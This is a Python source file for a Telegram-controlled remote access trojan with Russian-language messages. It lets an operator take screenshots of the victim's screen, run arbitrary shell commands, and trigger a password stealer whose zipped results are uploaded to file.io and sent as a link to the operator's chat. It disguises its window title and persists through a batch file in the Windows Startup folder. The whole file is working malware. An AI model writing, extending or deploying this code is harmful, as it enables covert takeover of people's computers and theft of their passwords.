import telebot
import os
import subprocess
from PIL import ImageGrab
import config
import sys
import shutil
import ctypes  # Новая импортируемая библиотека
import requests
import stealer
import string
import random
from telebot import types

bot = telebot.TeleBot(config.TOKEN)

rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
os.system(f"title {rand_title}")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Привет! Я бот для удалённого управления компьютером. Доступные команды:\\n"
                          "/screenshot - Сделать скриншот\\n"
                          "/message <текст> - Отправить сообщение\\n"
                          "/cmd <команда> - Выполнить команду в командной строке"
                          "/pas - Прислать пароли")

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    except Exception as e:
        bot.reply_to(message, f"Ошибка при создании скриншота: {e}")

@bot.message_handler(commands=['message'])
def send_message(message):
    try:
        text = message.text.replace('/message ', '')
        ctypes.windll.user32.MessageBoxW(0, text, "Сообщение от хулигана", 1)  # Использование ctypes для вывода сообщения в диалоговом окне
        bot.reply_to(message, "Сообщение отправлено")
    except Exception as e:
        bot.reply_to(message, f"Ошибка при отправке сообщения: {e}")

@bot.message_handler(commands=['cmd'])
def cmd(message):
    try:
        command = message.text.replace('/cmd ', '')
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        response = result.stdout if result.stdout else result.stderr
        bot.reply_to(message, f"Результат:\\n{response}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка при выполнении команды: {e}")

@bot.message_handler(commands=['pas'])
def mas(message):
    try:
        stealer.steal_all()
        arch = stealer.create_zip_archive()
        if arch:
            send_to_tg(stealer.ZIP_PATH)
            stealer.delFolder()
    except Exception as e:
        bot.reply_to(message, f"Ошибка при выполнении команды: {e}")

def upload_to_fileio(archive_path):
    with open(archive_path, "rb") as file:
        response = requests.post(config.FILE_IO_API_URL, files={"file": file})
        response_data = response.json()
        file.close()
        return response_data.get("link")


def send_to_tg(archive_path):
    file_io_link = upload_to_fileio(archive_path)
    lnkkb = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton(text="Скачать логи", url=file_io_link)
    lnkkb.add(btn)
    bot.send_message(config.YOUR_CHAT_ID, "Скачайте логи по кнопке ниже", reply_markup=lnkkb)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    with open(os.path.join(bat_path, "OpenBot.bat"), "w+") as bat_file:
        bat_file.write(f'start "" {file_path}\main.exe')

if __name__ == "__main__":
    # Отправляем сообщение при запуске скрипта
    bot.send_message(config.YOUR_CHAT_ID, "Компьютер в сети")
    # Добавляем скрипт в автозагрузку
    add_to_startup()
    bot.polling()